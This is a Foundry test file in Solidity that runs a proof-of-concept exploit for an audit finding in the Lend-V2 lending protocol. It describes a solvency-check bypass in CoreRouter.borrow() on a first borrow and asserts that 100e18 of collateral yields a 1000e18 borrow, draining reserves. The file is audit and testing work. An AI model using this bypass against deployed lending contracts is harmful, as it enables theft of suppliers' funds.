// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

import "forge-std/Test.sol";
import {Exploit, CoreRouter, LendStorage, LToken, MiniToken} from "./58396-lend-corerouter-borrow-has-an-incorrect-collateral-check.sol";

// Lend-V2 H-27 (finding 58396): CoreRouter.borrow() checks `collateral >= borrowAmount`
// where borrowAmount collapses to 0 on a first borrow (currentBorrow.borrowIndex == 0),
// bypassing the solvency check. Post 100e18 collateral -> borrow 1000e18.
contract Finding58396Test is Test {
    function test_exploit_zeroBorrowIndexBypass_drainsReserve() public {
        Exploit e = new Exploit();
        e.run();

        emit log_named_uint("collateral posted", e.collateralPosted());
        emit log_named_uint("borrow received", e.borrowedReceived());
        emit log_named_uint("reserve drained", e.reserveDrained());
        emit log_named_uint("net profit", e.profit());

        assertEq(e.collateralPosted(), 100 ether, "attacker posted only 100e18 collateral");
        assertEq(e.borrowedReceived(), 1000 ether, "attacker received the full uncollateralized 1000e18 borrow");
        assertEq(e.profit(), 900 ether, "net 900e18 extracted from honest suppliers");
        assertGt(e.borrowedReceived(), e.collateralPosted() * 5, "borrow far exceeds collateral");
    }
}
